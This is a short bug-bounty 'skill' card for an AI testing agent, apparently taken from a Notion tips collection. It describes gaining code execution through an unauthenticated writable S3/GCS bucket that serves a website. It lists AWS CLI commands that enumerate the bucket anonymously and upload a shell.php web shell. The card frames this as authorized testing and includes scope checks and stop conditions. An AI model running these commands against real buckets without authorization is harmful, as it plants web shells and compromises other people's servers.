# SKILL: S3 / GCS writable bucket → RCE or data overwrite

**Skill id:** `tip/s3-gcs-writable-bucket-rce-or-data-overwrite`  
**Category:** Recon, RCE  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/402dac31e88081938965f89264def1f6  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **Recon, RCE**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

لو الـ bucket بيخدم الـ webroot وقابل للكتابة بدون auth → ارفع ملف → RCE.

## Payload / Code

```
aws s3 ls s3://bucket --no-sign-request
aws s3 cp shell.php s3://bucket/ --no-sign-request
```

## Source

2026 Medium writeup (RCE from writable S3 webroot)

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
